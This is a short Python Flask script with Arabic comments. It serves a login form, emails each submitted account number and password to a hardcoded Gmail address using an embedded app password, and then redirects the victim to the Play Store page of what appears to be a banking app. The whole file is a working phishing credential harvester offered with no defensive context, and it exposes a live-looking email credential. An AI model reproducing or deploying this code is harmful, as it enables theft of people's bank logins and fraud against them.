from flask import Flask, render_template, request, redirect
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        try:
            account_number = request.form['account_number']
            password = request.form['password']

            # إرسال المعلومات إلى البريد الإلكتروني
            send_email(account_number, password)

            # إعادة توجيه المستخدم بعد النجاح
            return redirect("https://play.google.com/store/apps/details?id=com.mode.bok.ui")
        except Exception as e:
            # إذا حدث خطأ أثناء العملية، نطبعه لتتبع المشكلة
            print(f"حدث خطأ أثناء محاولة تسجيل الدخول: {e}")
            return "حدث خطأ أثناء معالجة البيانات، حاول مرة أخرى لاحقاً."

    return render_template('index.html')

def send_email(account_number, password):
    sender_email = "abdallihabdalazem12@gmail.com"
    receiver_email = "abdallihabdalazem12@gmail.com"
    subject = "معلومات تسجيل الدخول"
    body = f"رقم الحساب: {account_number}\nكلمة المرور: {password}"

    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = receiver_email

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            # تأكد من تحديث رمز مرور التطبيق في Gmail
            server.login(sender_email, "pxllassgfqqyejgh")  # كلمة مرور التطبيق
            server.sendmail(sender_email, receiver_email, msg.as_string())
        print("تم إرسال البريد الإلكتروني بنجاح.")
    except Exception as e:
        print(f"حدث خطأ أثناء محاولة إرسال البريد: {e}")

if __name__ == '__main__':
    app.run(debug=True)
